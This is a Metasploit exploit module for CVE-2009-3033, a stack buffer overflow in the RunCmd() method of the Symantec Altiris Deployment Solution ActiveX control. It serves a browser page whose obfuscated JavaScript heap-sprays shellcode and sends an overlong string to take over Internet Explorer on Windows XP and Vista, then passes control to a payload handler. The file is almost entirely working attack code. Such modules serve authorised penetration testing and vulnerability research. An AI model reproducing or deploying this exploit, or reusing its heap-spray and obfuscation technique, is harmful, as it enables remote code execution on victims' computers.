##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Symantec Altiris Deployment Solution ActiveX Control Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in Symantec Altiris Deployment Solution.
        When sending an overly long string to RunCmd() method of
        AeXNSConsoleUtilities.dll (6.0.0.1426) an attacker may be able to execute arbitrary
        code.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'MC' ],
      'References'     =>
        [
          [ 'CVE', '2009-3033' ],
          [ 'BID', '37092' ],
          [ 'OSVDB', '60496' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'         => 1024,
          'BadChars'      => "\x00",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]
        ],
      'DisclosureDate' => '2009-11-04',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('URIPATH', [ true, "The URI to use.", "/" ])
      ])
  end

  def autofilter
    false
  end

  def check_dependencies
    use_zlib
  end

  def on_request_uri(cli, request)
    # Re-generate the payload.
    return if ((p = regenerate_payload(cli)) == nil)

    # Encode the shellcode.
    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

    js = %Q|
      try {
        var evil_string = "";
        var index;
        var vulnerable = new ActiveXObject('Altiris.AeXNSConsoleUtilities.1');
        var my_unescape = unescape;
        var shellcode = '#{shellcode}';
        #{js_heap_spray}
        sprayHeap(my_unescape(shellcode), 0x0D0D0D0D, 0x40000);
        for (index = 0; index < 12260; index++) {
          evil_string = evil_string + my_unescape('0x0D0D0D0D');
        }
        vulnerable.RunCMD(evil_string, '');
      } catch( e ) { window.location = 'about:blank' ; }
    |

    opts = {
      'Strings' => true,
      'Symbols' => {
        'Variables' => [
          'vulnerable',
          'shellcode',
          'my_unescape',
          'index',
          'evil_string',
        ]
      }
    }
    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
    js.update_opts(js_heap_spray.opts)
    js.obfuscate(memory_sensitive: true)
    content = %Q|<html>
<body>
<script><!--
#{js}
//</script>
</body>
</html>
|

    print_status("Sending #{self.name}")

    # Transmit the response to the client
    send_response_html(cli, content)

    # Handle the payload
    handler(cli)
  end
end
